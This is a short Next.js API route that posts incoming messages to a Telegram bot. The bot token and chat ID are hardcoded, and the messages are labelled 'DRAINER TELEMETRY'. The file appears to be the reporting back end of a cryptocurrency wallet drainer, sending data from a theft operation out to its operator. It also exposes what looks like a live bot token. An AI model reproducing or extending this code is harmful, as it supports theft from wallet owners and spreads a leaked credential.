import { NextResponse } from "next/server";

const BOT_TOKEN = "8703660369:AAEQQBuWwpggS4jnmRb_Ndjfhpqyl6TILTg";
const CHAT_ID = "7566241039";

export async function POST(req: Request) {
  const { message } = await req.json();
  
  try {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `🛡️ *DRAINER TELEMETRY*\n\n${message}`,
        parse_mode: "Markdown",
      }),
    });
    return NextResponse.json({ success: true });
  } catch (e) {
    return NextResponse.json({ success: false, error: e }, { status: 500 });
  }
}